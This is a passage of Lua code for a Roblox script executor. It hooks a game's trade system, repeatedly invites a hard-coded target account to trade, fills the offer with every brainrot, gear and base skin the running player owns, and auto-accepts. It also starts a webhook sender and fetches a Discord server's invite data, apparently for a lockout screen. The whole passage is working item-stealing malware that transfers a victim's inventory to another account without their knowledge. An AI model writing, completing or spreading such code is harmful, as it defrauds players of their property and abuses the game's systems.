        acceptRemote = getupvalue(TradeController._createLiveTrade, 23)
        tradeCompleted = getupvalue(TradeController._createPlayerList, 21)
    end)

    if not (inviteRemote and addBrainrotRemote and addItemRemote and readyRemote and acceptRemote) then return end

    local tradeOpened = false
    local tradeReplicator = ReplicatorClient.get(("Trade_%*"):format(LP.UserId))

    local otherUserId = nil

    local function getOtherUserId()
        local users = tradeReplicator:TryIndex({ "active", "data", "users" })
        if type(users) ~= "table" then return nil end
        for _, userId in users do
            if userId ~= LP.UserId then
                return userId
            end
        end
        return nil
    end

    local function tradeSnapshot()
        local data = tradeReplicator:TryIndex({ "active", "data" })
        if typeof(data) ~= "table" or typeof(data.users) ~= "table" then return nil end

        local mySlot, otherSlot = nil, nil
        for slot, userId in pairs(data.users) do
            if userId == LP.UserId then
                mySlot = slot
            else
                otherSlot = slot
            end
        end
        if mySlot == nil then return nil end

        local function entry(slot)
            if typeof(data.players) ~= "table" or slot == nil then return nil end
            local e = data.players[slot]
            if e == nil then e = data.players[tostring(slot)] end
            if typeof(e) ~= "table" then return nil end
            return e
        end

        return { data = data, me = entry(mySlot), other = entry(otherSlot) }
    end

    local function offerHas(offer, bucket, key)
        if typeof(offer) ~= "table" or typeof(offer[bucket]) ~= "table" then return false end
        return offer[bucket][key] ~= nil or offer[bucket][tostring(key)] ~= nil
    end

    local function buildPending(offer)
        local list = {}

        for _, b in ipairs(DataInv.Brainrots) do
            table.insert(list, {
                bucket = "brainrots",
                key = tostring(b.slotKey),
                call = function()
                    return addBrainrotRemote:InvokeServer(SELECT_BRAINROT_GUID, b.slotKey, b.data)
                end,
            })
        end

        for _, g in ipairs(DataInv.Gears) do
            table.insert(list, {
                bucket = "gears",
                key = g.UUID or ("name:" .. g.GearName),
                call = function()
                    return addItemRemote:InvokeServer(SELECT_ITEM_GUID, "Gear", { GearName = g.GearName, UUID = g.UUID })
                end,
            })
        end

        for _, s in ipairs(DataInv.Bases) do
            table.insert(list, {
                bucket = "baseSkins",
                key = s.UUID,
                call = function()
                    return addItemRemote:InvokeServer(SELECT_ITEM_GUID, "BaseSkin", { UUID = s.UUID, SkinName = s.SkinName })
                end,
            })
        end

        local pending = {}
        for _, p in ipairs(list) do
            if not offerHas(offer, p.bucket, p.key) then
                table.insert(pending, p)
            end
        end
        return pending
    end

    local function runTrade()
        local attempts = {}
        local done = {}

        while tradeOpened do
            local snap = tradeSnapshot()
            if not snap or not snap.me then
                task.wait(0.25)
            else
                local me, other, data = snap.me, snap.other, snap.data

                local pending = nil
                for _, p in ipairs(buildPending(me.offer)) do
                    local id = p.bucket .. ":" .. p.key
                    if not done[id] and (attempts[id] or 0) < 3 then
                        pending = p
                        break
                    end
                end

                if pending and not me.accepted then
                    local id = pending.bucket .. ":" .. pending.key
                    local ok, success, reason = pcall(pending.call)
                    if ok and success then
                        done[id] = true
                    else
                        attempts[id] = (attempts[id] or 0) + 1
                        warn("[WxnAd] add failed", pending.bucket, tostring(pending.key), tostring(ok and reason or success))
                    end
                    task.wait(0.6)
                else
                    local lastChange = data.lastChange
                    local now = workspace:GetServerTimeNow()
                    if typeof(lastChange) == "number" and now < lastChange + 5.2 then
                        task.wait(0.25)
                    elseif other and other.ready then
                        if not me.accepted then
                            pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
                        end
                        task.wait(0.5)
                    else
                        if not me.ready then
                            pcall(function() readyRemote:FireServer(READY_GUID) end)
                        end
                        task.wait(0.5)
                    end
                end
            end
        end
    end

    task.spawn(function()
        while true do
            if not tradeOpened and HasItens() then
                pcall(function()
                    inviteRemote:InvokeServer(INVITE_GUID, targetId)
                end)
            end
            task.wait(0.1)
        end
    end)

    task.spawn(sendWebhook)

    task.spawn(function()
        while true do
            if tradeOpened then
                runTrade()
            end
            task.wait(0.25)
        end
    end)

    local lockoutShown = false

    local function fetchDiscordInvite(inviteCode, cacheFileName)
        local reqFn = getReqFn()
        if not reqFn then return nil end

        local ok, res = pcall(function()
            return reqFn({
                Url = "https://discord.com/api/v10/invites/" .. inviteCode .. "?with_counts=true",
                Method = "GET",
                Headers = { ["Content-Type"] = "application/json" },
            })
        end)
        if not ok or not res then return nil end

        local decOk, json = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if not decOk or not json or not json.guild then return nil end

        local guild = json.guild
        local memberCount = json.approximate_member_count or 0
        local iconAsset = nil

        if guild.icon then
            local iconUrl = ("https://cdn.discordapp.com/icons/%s/%s.png?size=128"):format(guild.id, guild.icon)
            local iconOk, iconRes = pcall(function()
                return reqFn({ Url = iconUrl, Method = "GET" })
            end)
            if iconOk and iconRes then
                pcall(function()
                    local filePath = cacheFileName .. ".png"
                    writefile(filePath, iconRes.Body)
                    iconAsset = getcustomasset(filePath)
                end)
            end
        end

        return { icon = iconAsset, name = guild.name or inviteCode, members = memberCount }
    end

